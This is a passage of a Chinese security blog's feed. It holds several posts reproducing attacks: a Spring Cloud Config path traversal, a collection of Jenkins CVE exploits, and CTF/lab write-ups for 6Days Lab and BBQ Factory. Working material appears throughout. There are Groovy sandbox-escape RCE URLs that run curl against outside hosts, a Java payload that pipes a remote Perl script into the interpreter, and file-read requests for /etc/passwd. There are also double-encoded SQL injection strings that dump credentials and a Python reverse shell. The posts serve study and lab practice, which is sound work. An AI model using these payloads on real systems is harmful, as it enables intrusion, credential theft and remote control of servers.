rel="noopener">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md</a></p><p>poc：</p><pre><code>利用点1：curl http://127.0.0.1:9988/foo/profiles/%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp/aaa.xxx读取/User/xuanyonghao/tmp/aaa.xxx文件foo 对应 {application}profiles 对应 {profiles}%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp 对应 {label}todo 条件限制：todo 1. 文件必须有后缀，也就是.txt等等。todo 2. cloud: config: server: native: search-locations: file:///tmp/{label}，此处的目录需要有{application}或{profiles}或{label}，因为在上述触发点会对url对应段进行替换进来location，导致目录穿越，但是会限制文件后缀利用点2：org.springframework.cloud.config.server.resource.ResourceController#resolveLabel(java.lang.String)利用此处把label处的(_)替换为/curl http://127.0.0.1:9988/foo/profiles/..%28_%29Users%28_%29xuanyonghao%28_%29tmp/aaa.xxxtodo 条件限制：todo 1. 文件必须有后缀，也就是.txt等等。todo 2. 不像利用点1处，不需要配置{application}{profiles}{label}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虽说是Spring框架漏洞，但以下包含并不仅Spring Framework，Spring Boot，还有Spring Cloud，Spring Data，Spring Security等。&lt;/p&gt;
&lt;h3 id=&quot;CVE-2010-1622-Spring-Framewor
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins漏洞集合复现</title>
    <link href="/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/"/>
    <id>/2020/03/Jenkins漏洞集合复现/</id>
    <published>2020-03-27T06:56:40.000Z</published>
    <updated>2020-03-27T07:07:18.135Z</updated>
    
    <content type="html"><![CDATA[<p>复现文章和脚本大都是网上收集，大部分能找到出处的，个别找不到明确的地址。</p><h3 id="CVE-2015-8103-反序列化远程代码执行"><a href="#CVE-2015-8103-反序列化远程代码执行" class="headerlink" title="CVE-2015-8103 反序列化远程代码执行"></a>CVE-2015-8103 反序列化远程代码执行</h3><p>1.638之前的Jenkins和1.625.2之前的LTS中的Jenkins CLI子系统，允许远程攻击者通过制作的序列化Java对象执行有问题的commons-collections。</p><p>利用脚本：<a href="https://github.com/LeoHuang2015/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/LeoHuang2015/jenkins-cli-exploit</a></p><p>执行后有类似如下反应：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145130.png" alt="image-20200327115239320"></p><p>还可以使用msf中的模块<code>exploit/linux/misc/jenkins_java_deserialize</code>来执行攻击反弹shell。</p><h3 id="CVE-2016-0788-Jenkins-CI和LTS-远程代码执行漏洞"><a href="#CVE-2016-0788-Jenkins-CI和LTS-远程代码执行漏洞" class="headerlink" title="CVE-2016-0788 Jenkins CI和LTS 远程代码执行漏洞"></a>CVE-2016-0788 Jenkins CI和LTS 远程代码执行漏洞</h3><p>CloudBeesJenkinsCI1.650之前版本和LTS1.642.2之前版本的remoting模块中存在安全漏洞。远程攻击者可通过打开JRMP监听程序利用该漏洞执行任意代码。</p><p>利用需要X-Jenkins-CLI2-Port对应的端口，如果Jenkins无法获取CLI版本2的端口标头“ X-Jenkins-CLI2-Port”，它会退回到版本1。</p><p>利用ys生成二进制文件：<code>java -jar ysoserial.jar CommonsCollections3 &quot;curl http://r9rub4.ceye.io/&quot; &gt; payload.bin</code></p><p>利用脚本：<code>https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py</code></p><p>发送的二进制文件实际上是十六进制的(&lt;===[JENKINS REMOTING CAPACITY]===&gt;)与其后base64的编码构成。使用类似反应如下：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145133.png" alt="image-20200327121322560"></p><h3 id="CVE-2016-0792-低权限用户命令执行"><a href="#CVE-2016-0792-低权限用户命令执行" class="headerlink" title="CVE-2016-0792 低权限用户命令执行"></a>CVE-2016-0792 低权限用户命令执行</h3><p>影响版本：jenkins小于 1.650</p><p>利用脚本：<code>https://github.com/jpiechowka/jenkins-cve-2016-0792</code></p><p>执行后类似如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145135.png" alt="image-20200327120724417"></p><h3 id="CVE-2016-9299-代码执行"><a href="#CVE-2016-9299-代码执行" class="headerlink" title="CVE-2016-9299 代码执行"></a>CVE-2016-9299 代码执行</h3><p>2.32之前的Jenkins和2.19.3之前的LTS中的远程处理模块允许远程攻击者通过精心制作的序列化Java对象执行任意代码，从而触发对第三方服务器的LDAP查询。</p><p>关于这个漏洞的分析和代码利用，已经有详细的分析文章：<code>https://paper.seebug.org/199/</code></p><p>msf有成熟的利用模块：<code>exploit/linux/misc/jenkins_ldap_deserialize</code></p><h3 id="CVE-2017-1000353-Jenkins-CI-远程代码执行"><a href="#CVE-2017-1000353-Jenkins-CI-远程代码执行" class="headerlink" title="CVE-2017-1000353 Jenkins-CI 远程代码执行"></a>CVE-2017-1000353 Jenkins-CI 远程代码执行</h3><p>影响版本：Jenkins&lt;=2.56。Jenkins LTS &lt;= 2.46.1</p><p>下载poc<code>https://github.com/vulhub/CVE-2017-1000353</code></p><p>执行生成字节码文件。</p><pre><code>java  -jar  CVE-2017-1000353-SNAPSHOT-all.jar  jenkins_poc.ser  &quot;curl http://xxx.ceye.io&quot;</code></pre><p>利用py文件来进行发送</p><pre><code>python exploit.py http://x.x.x.x:8080 jenkins_poc.ser</code></pre><p>会有如下反应</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145340.png" alt="image-20200325165630218"></p><h3 id="CVE-2018-1000110-用户枚举"><a href="#CVE-2018-1000110-用户枚举" class="headerlink" title="CVE-2018-1000110 用户枚举"></a>CVE-2018-1000110 用户枚举</h3><pre><code>模糊搜索：http://x.x.x.x:8080/search/?q=a</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145344.png" alt="image-20200325165813965"></p><pre><code>http://x.x.x.x:8080/search/suggest?query=a</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145347.png" alt="image-20200325165911492"></p><p>如果git插件小于3.7，也可以使用如下</p><pre><code>http://x.x.x.x:8080/git/search/?q=ahttp://x.x.x.x:8080/git/search/suggest?query=a</code></pre><h3 id="CVE-2018-1000861-远程命令执行"><a href="#CVE-2018-1000861-远程命令执行" class="headerlink" title="CVE-2018-1000861 远程命令执行"></a>CVE-2018-1000861 远程命令执行</h3><p>可以使用如下的一键化脚本</p><pre><code>https://github.com/orangetw/awesome-jenkins-rce-2019</code></pre><p>也可以自定义发送请求</p><pre><code>http://x.x.x.x:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public class x {public x(){&quot;curl http://xxx.ceye.io/CVE-2018-1000861&quot;.execute()}}</code></pre><p>页面返回空白，响应为</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145447.png" alt="image-20200325171107715"></p><p>如果使用脚本，则同样效果</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145454.png" alt="image-20200325171239538"></p><p>还可以使用的POC，使用会提示错误信息，但命令已执行。</p><pre><code>/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(&quot;curl http://xxx.ceye.io/CVE-2018-1000861&quot;)%7d)%0aclass+Person%7b%7d/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+&quot;curl http://xxx.ceye.io/CVE-2018-1000861&quot;.execute().text+%7d)%0aclass+Person%7b%7d</code></pre><h3 id="CVE-2018-1999002-任意文件读取"><a href="#CVE-2018-1999002-任意文件读取" class="headerlink" title="CVE-2018-1999002 任意文件读取"></a>CVE-2018-1999002 任意文件读取</h3><p>影响版本：Jenkins weekly 2.132 以及更早的版本。Jenkins LTS 2.121.1 以及更早的版本</p><p>可以读取Windows系统服务器中的任意文件，且在特定而条件下也可以读取Linux系统服务器中的文件.</p><p>详情：<code>https://xz.aliyun.com/t/2486</code></p><p>结合payload来看，我们请求的url为<code>/plugin/credentials/.ini</code>，则<code>base</code>为空，扩展名（ext变量）即为<code>.ini</code>，然后通过一系列的尝试openURL，在此例中即最后一个情形<code>con = openURL(map(base+&#39;_&#39;+ locale.getLanguage()+ext));</code>，会去请求<code>_../../../../../../../../../../../../windows/win.ini</code> ，尽管目录<code>_..</code>并不存在，但在win下可以直接通过路径穿越来绕过。但在linux，则需要一个带有<code>_</code>的目录来想办法绕过。</p><p>需要已经开启了匿名用户读取权限，在请求头中添加</p><pre><code>Accept-Language: /../../../../../../../../etc/passwd</code></pre><p>处理请求中的包含路径，比如/plugin/xxxx，可以尝试</p><pre><code>/plugin/jquery-detached/.xml/plugin/jquery-detached/.key/plugin/credentials/.ini</code></pre><p>在Windows下这么使用</p><pre><code>GET /plugin/credentials/.ini HTTP/1.1Host: x.x.x.x:8080Accept: text/javascript, text/html, application/xml, text/xml, */*X-Prototype-Version: 1.7DNT: 1X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36Origin: http://x.x.x.x:8080Referer: http://x.x.x.x:8080/Accept-Encoding: gzip, deflateAccept-Language: /../../../../../../../../etc/passwdCookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971Connection: close</code></pre><h3 id="CVE-2018-1000600-Jenkins-GitHub-信息泄露"><a href="#CVE-2018-1000600-Jenkins-GitHub-信息泄露" class="headerlink" title="CVE-2018-1000600 Jenkins GitHub 信息泄露"></a>CVE-2018-1000600 Jenkins GitHub 信息泄露</h3><p>影响版本：Jenkins GitHub插件小于1.29.1</p><p>利用的POC为，其中user1为用户名。</p><pre><code>/securityRealm/user/user1/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://xxx.ceye.io</code></pre><p>执行后显示</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145502.png" alt="image-20200326173809956"></p><p>查看DNSlog回显</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145507.png" alt="image-20200326173837239"></p><h3 id="CVE-2019-1003000-远程代码执行"><a href="#CVE-2019-1003000-远程代码执行" class="headerlink" title="CVE-2019-1003000 远程代码执行"></a>CVE-2019-1003000 远程代码执行</h3><p>实际影响版本及编号：<strong>CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)</strong></p><p>拥有Overall/Read 权限的用户可以绕过沙盒保护，在jenkins可以执行任意代码。此漏洞需要一个账号密码和一个存在的job。受影响插件版本：Pipeline: Declarative 插件 &lt;= 1.3.4。Pipeline: Groovy 插 件 &lt;= 2.61。Script Security 插 件 &lt;= 1.49。</p><p>下载环境和利用代码：<code>https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git</code></p><p>执行利用后显示</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145513.png" alt="image-20200326112837107"></p><p>我们的job中也被添加了如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145517.png" alt="image-20200326112903149"></p><h3 id="CVE-2019-1003005-远程代码执行"><a href="#CVE-2019-1003005-远程代码执行" class="headerlink" title="CVE-2019-1003005 远程代码执行"></a>CVE-2019-1003005 远程代码执行</h3><p>受影响版本：</p><pre><code>Jenkins 2.53Jenkins 2.122Jenkins 2.137Jenkins 2.138 启用匿名读取Jenkins 2.152 启用匿名读取Jenkins 2.153 启用匿名读取Script Security Plugin 1.43Script Security Plugin 1.48</code></pre><p>下载利用脚本：<code>https://github.com/orangetw/awesome-jenkins-rce-2019</code></p><p>构建环境后，执行脚本如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145520.png" alt="image-20200326124130037"></p><p>显示如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145522.png" alt="image-20200326124151396"></p><p>当然如果不想使用这种一键式脚本还可以自己构造jar来利用</p><ol><li>创建Payload.java</li></ol><pre><code>public class Payload {    public Payload(){        try {            String payload = &quot;curl orange.tw/bc.pl | perl -&quot;;            String[] cmds = {&quot;/bin/bash&quot;, &quot;-c&quot;, payload};            java.lang.Runtime.getRuntime().exec(cmds);        } catch (Exception e) { }    }}</code></pre><ol start="2"><li>编译文件，创建META-INF/services/文件夹，同时在文件夹下创建名为org.codehaus.groovy.plugins.Runners的文件。内容随意，比如Payload</li><li>文件创建后，在某一目录下，文件树类似如下：</li></ol><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145524.png" alt="image-20200327093359850"></p><ol start="4"><li>编译以上目录<code>jar cvf poc-1.jar code/</code></li><li>将编译产生的文件移动到类似如下地址<code>cp poc-1.jar ~/www/code/payload/poc/1/</code></li><li>将www目录移动到web服务器中，地址类似：<code>http://xxx.com/code/payload/poc/1.poc-1.jar</code></li><li>利用如下exp</li></ol><pre><code>http://&lt;TARGET HOST&gt;/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=&#39;payload&#39;, root=&#39;http://&lt;EXPLOIT HOST&gt;&#39;)%0a@Grab(group=&#39;package&#39;, module=&#39;payload&#39;, version=&#39;1&#39;)%0aimport Payload;</code></pre><h3 id="CVE-2019-1003029-Script-Security-Plugin沙箱绕过"><a href="#CVE-2019-1003029-Script-Security-Plugin沙箱绕过" class="headerlink" title="CVE-2019-1003029 Script Security Plugin沙箱绕过"></a>CVE-2019-1003029 Script Security Plugin沙箱绕过</h3><p>此漏洞和CVE-2019-1003005漏洞同样都是由Script Security插件引起。利用方式和上一致。影响版本1.55以下。</p><h3 id="CVE-2019-10392-Jenkins-Git-插件命令执行"><a href="#CVE-2019-10392-Jenkins-Git-插件命令执行" class="headerlink" title="CVE-2019-10392 Jenkins Git 插件命令执行"></a>CVE-2019-10392 Jenkins Git 插件命令执行</h3><p>之前做过这个漏洞的复现，地址：<a href="https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19认证远程RCE/" target="_blank" rel="noopener">https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/</a></p><h3 id="CVE-2019-10352-任意文件写入"><a href="#CVE-2019-10352-任意文件写入" class="headerlink" title="CVE-2019-10352 任意文件写入"></a>CVE-2019-10352 任意文件写入</h3><p>该漏洞使经过身份验证的具有Job/Configure权限的攻击者可以使用目标之外的文件名定义文件参数，从而导致任意文件写入。</p><p>创建一个名为test的新“自由式项目”（该项目的工作空间将位于JENKINS_HOME/workspace/test）</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145528.png" alt="image-20200327131927499"></p><p>创建一个受限制的用户，提供总体读取和作业构建，配置和读取权限。在配置中选择文件参数</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145529.png" alt="image-20200327132432562"></p><p>单击构建选择上传文件，上传一个1.png</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145532.png" alt="image-20200327132552837"></p><p>开始构建就可以将其写入运行Jenkins的用户有权写入的文件系统上的任何位置。</p><h3 id="CVE-2019-10300-GitLab插件信息泄露漏洞"><a href="#CVE-2019-10300-GitLab插件信息泄露漏洞" class="headerlink" title="CVE-2019-10300 GitLab插件信息泄露漏洞"></a>CVE-2019-10300 GitLab插件信息泄露漏洞</h3><p>Jenkins GitLab插件1.5.11 的功能中存在一个可利用的信息泄露漏洞。来自具有“ Overall/Read”权限的用户（例如，启用了匿名用户）的特制HTTP请求，可能导致该插件的受影响版本将Jenkins凭据数据库中的凭据公开给攻击者控制的服务器。</p><p>需要下载插件：<code>https://mirrors.tuna.tsinghua.edu.cn/jenkins/plugins/gitlab-plugin/1.5.11/gitlab-plugin.hpi</code></p><p>利用分析：<code>https://talosintelligence.com/vulnerability_reports/TALOS-2019-0788</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;复现文章和脚本大都是网上收集，大部分能找到出处的，个别找不到明确的地址。&lt;/p&gt;
&lt;h3 id=&quot;CVE-2015-8103-反序列化远程代码执行&quot;&gt;&lt;a href=&quot;#CVE-2015-8103-反序列化远程代码执行&quot; class=&quot;headerlink&quot; title=&quot;
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>6Days Lab - v1.0.1</title>
    <link href="/2020/03/6Days-Lab-v1-0-1/"/>
    <id>/2020/03/6Days-Lab-v1-0-1/</id>
    <published>2020-03-25T07:35:02.000Z</published>
    <updated>2020-03-25T08:08:56.223Z</updated>
    
    <content type="html"><![CDATA[<p>访问首页发现一个是填入优惠码的地方，同时还发现一个未加载的图片。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153405.png" alt="image-20200324154403672"></p><p>点击图片查看链接，发现是内网地址，估计是系统没把内网地址进行转换。</p><pre><code>http://10.66.20.100/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg</code></pre><p>不过可以通过此判断大概存在任意文件读取。再查看下面的优惠码，随便输入优惠码返回为空，但是输入单引号等会提示被IPS拦截。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153407.png" alt="image-20200324154610973"></p><p>那么这里也可能有SQL注入。</p><p>先查看上面文件读取是否可以读取到文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153409.png" alt="image-20200324154707368"></p><p>再去读取优惠码页面，里面有个sql语句的拼接。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153411.png" alt="image-20200324154744119"></p><p>再去查看config.php。发现数据库的账号密码</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153414.png" alt="image-20200324154854709"></p><p>再去尝试读取本地系统文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153415.png" alt="image-20200324155044173"></p><p>由于权限原因，是不能直接读取flag文件。尝试查找对应的目录</p><pre><code>/proc/sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid。/proc/pid/cmdline   则可以看到对应pid进程的完整命令行。</code></pre><p>在查找内网端口服务的时候，发现80端口并没有开放，也就是内网端口和外部访问端口不一致，应该是做了端口转发出来。也许可以在内网端口上直接来执行SQL注入绕过IPS。遍历端口后发现8080端口是首页地址。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153417.png" alt="image-20200324172944910"></p><p>测试双编码的情况下，可以绕过IPS，只是比在外部执行可以看到明显的返回。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153420.png" alt="image-20200324173354044"></p><p>查询得知两字段</p><pre><code>aaaa%2527union%2520select%25201,2%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153422.png" alt="image-20200325095033797"></p><p>库名，应该是需要查询<code>fancydb</code></p><pre><code>aaa%2527%2520union%2520select%2520group_concat%2528schema_name%2529%252C2%2520from%2520information_schema.schemata%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153423.png" alt="image-20200325095158899"></p><p>查表名</p><pre><code>aaa%2527%2520union%2520select%2520group_concat%2528table_name%2529%252C2%2520from%2520information_schema.tables%2520where%2520table_schema%253D0x66616e63796462%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153425.png" alt="image-20200325095533778"></p><p>字段名</p><pre><code>aaa%2527%2520union%2520select%2520group_concat%2528column_name%2529%252C2%2520from%2520information_schema.columns%2520where%2520table_name%253D%2527users%2527%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153427.png" alt="image-20200325095658267"></p><p>查询到账号密码<code>andrea:SayNoToPentests</code></p><pre><code>aaaaaa%2527%2520union%2520select%2520group_concat%2528username%252C0x3a%252Cpassword%2529%252C2%2520from%2520users%2523</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153431.png" alt="image-20200325095818906"></p><p>尝试利用sql注入写文件，不过需要先把物理路径找到，尝试默认的apache路径<code>/var/www/html</code>，试过发现路径是如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153433.png" alt="image-20200325100055468"></p><p>尝试导出文件失败，想起来用户非root，且不具备secure_file_priv。后来想找登陆和连接入口的时候感觉这个用户名比较眼熟，才想起来用户在passwd文件中出现过。且之前尝试搜索文件的时候尝试查找了用户下面的历史命令文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153434.png" alt="image-20200325102225242"></p><p>那就直接试试ssh，确实可以登陆但是没有回显</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153437.png" alt="image-20200325102859382"></p><p>尝试反弹shell，发现是个rbash，不能这么反弹shell</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153438.png" alt="image-20200325103330806"></p><p>尝试python反弹</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>获得反弹shell，同时使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>，获取原生终端</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153440.png" alt="image-20200325103553741"></p><p>目录下有个suid位文件，不过不能利用，权限不对。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153442.png" alt="image-20200325104928838"></p><p>没有历史命令文件等，不可执行sudo，查找内核漏洞，内核还不算高。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153444.png" alt="image-20200325110140941"></p><p>开启一个外网服务，下载到服务器，发现可以正常编译不报错。。。执行后获得root权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153445.png" alt="image-20200325110747898"></p><p>找到根目录下的flag文件，是一个可执行文件。执行后提示完成</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153447.png" alt="image-20200325110822459"></p><p>回过头再去看那个dog文件是啥，发现还是提示Access Denied。难道这玩意就是寻开心的？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;访问首页发现一个是填入优惠码的地方，同时还发现一个未加载的图片。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153405.png&quot; alt=&quot;ima
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>BBQ Factory</title>
    <link href="/2020/03/BBQ-Factory/"/>
    <id>/2020/03/BBQ-Factory/</id>
    <published>2020-03-25T07:31:57.000Z</published>
    <updated>2020-03-25T07:31:57.682Z</updated>
    
    <content type="html"><![CDATA[<p>这个并没有做完，卡在了某一点。先做记录<br>打开页面访问</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152809.png" alt="image-20200318173039025"></p><p>看到如下地址</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152814.png" alt="image-20200318173054306"></p><pre><code>http://ctf30.root-me.org//details.php?file=pdf/GROPIMP.pdf</code></pre><p>基本可以断定这是个任意文件读取。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152817.png" alt="image-20200318173231628"></p><p>现在问题是需要去读取什么文件呢。先放置，查看目录，找打一个admin目录。跳转到8080端口</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152821.png" alt="image-20200318173323249"></p><p>暂时没有爆破的欲望，继续查看，本来打算去读取一些密码，但是不知道该读取哪些文件。</p><p>尝试读取access日志，没有发现东西，想查看配置文件，比如phpmyadmin的配置文件，但是没找对目录。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152823.png" alt="image-20200318173433770"></p><p>后来在wamp的日志中找到了error日志，在日志中发现了phpmyadmin的名称。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152825.png" alt="image-20200318173214281"></p><p>phpmyadmin的密码是空密码设置，所以要是可以找到phpmyadmin的登陆地址就可以直接进去。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152827.png" alt="image-20200318173641948"></p><p>不过遗憾的是没使用phpmyadmin。准确的说是没有找到可以访问phpmyadmin的路径。检索wamp的版本</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152828.png" alt="image-20200319094207912"></p><p>现在明显的入手点就是admin页面，查看httpd.conf看看有没有目录地址，查看过后发现只有80端口一个服务。也没有虚拟站点和配置文件导入，意思是8080的端口不是wamp启动的。。。</p><p>不过随便输一个目录，在8080端口下，会报错显示一个exe文件地址。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152830.png" alt="image-20200319143027015"></p><p>下载查看，打开后发现是一个web的启动器，自动在8080端口开放。也许就是系统上8080端口服务的提供器。</p><p>丢到IDA中查看一下，也许有账号密码呢。尝试搜索Login error。找到如下信息</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152832.png" alt="image-20200319145603084"></p><p>这个信息正好是返回的响应，从里面可以看到他需要一个administration账号权限。访问下面显示的连接可以看到</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152835.png" alt="image-20200319145748709"></p><p>账号密码的来源，超上面看admin/amaBBQlova，登陆成功设置cookie：BBQOOQIE=9491b1db2da8d1efa106f013e4576b5a。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152837.png" alt="image-20200319145828589"></p><p>登陆后再去查看admin页面，貌似还需要别的？</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152838.png" alt="image-20200319151329726"></p><p>这个系统就给出了三个地址，<code>/index  /login  /admin</code>，他到底还要啥啊。。</p><p>尝试探测端口，但是稍微加点线程系统就卡住，试了半天，一个常用服务的端口都没找到。在尝试ssh的时候发现好像默认是优先公私钥登陆，所以读取到公私钥也可以访问，但是尝试几个路径都没发现公私钥。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个并没有做完，卡在了某一点。先做记录&lt;br&gt;打开页面访问&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325152809.png&quot; alt=&quot;image-
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>HTTP 请求走私</title>
    <link href="/2020/03/HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>/2020/03/HTTP-请求走私/</id>
    <published>2020-03-12T02:29:20.000Z</published>
    <updated>2020-03-12T04:09:36.846Z</updated>
    
    <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原理有两篇文章写的十分详细，此处不在过多陈述。</p><p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p><p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">一篇文章带你读懂 HTTP Smuggling 攻击</a></p><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>实验室：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>登陆访问即可，看到实验室说明，只需要后端收到GPOST的请求方法即可。</p><p><img src="/images/2020/03/12/8145cce0-6409-11ea-a731-5d1f4a3ce08c.png" alt="image20200311170411457.png"></p><p>通过要求可以得知这是一个前端CL，后端TE的方式。先关闭burp的自动更新content-length的设置，然后修改为6字节，先发送一个请求，这个请求先不需要管。</p><p><img 